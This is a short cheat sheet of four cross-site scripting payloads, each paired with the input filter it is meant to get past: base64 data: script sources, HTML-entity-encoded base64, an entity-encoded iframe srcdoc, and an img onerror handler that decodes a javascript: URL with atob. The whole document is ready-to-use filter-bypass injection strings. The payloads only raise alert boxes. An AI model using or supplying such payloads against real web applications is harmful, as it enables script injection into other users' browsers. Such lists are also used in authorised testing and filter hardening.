1. XSS with Base64 Encoded Script src
- Payload: <script src=data:text/javascript;base64,YWxlcnQoMSk=></script>
- Condition: Input is reflected into HTML where keywords like alert, prompt, or script content are blocked
- Case: Base64 encode the JavaScript payload (YWxlcnQoMSk= = alert(1)) and load it via data: protocol with base64. The filter cannot detect the payload inside base64
- Output: <script src=data:text/javascript;base64,YWxlcnQoMSk=></script>

---

2. XSS with Base64 and HTML Entities
- Payload: <script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>
- Condition: Input is reflected into HTML where keywords and base64 strings are blocked
- Case: HTML entity encode each character of the base64 string to bypass filters that detect base64 payloads
- Output: <script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>

---

3. XSS with Iframe srcdoc HTML Encoded
- Payload: <iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
- Condition: Input is reflected into HTML where angle brackets (< >) and parentheses () are blocked but HTML entities are allowed
- Case: Use HTML entities to encode the entire payload inside an iframe srcdoc attribute. The browser decodes the entities and executes the script
- Output: <iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>

---

4. XSS with Img Tag and atob Base64
- Payload: <img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
- Condition: Input is reflected into HTML where keywords like javascript and alert are blocked
- Case: Use atob() to decode a base64 string (amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p = javascript:alert(document.domain)) and redirect to it via location
- Output: <img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
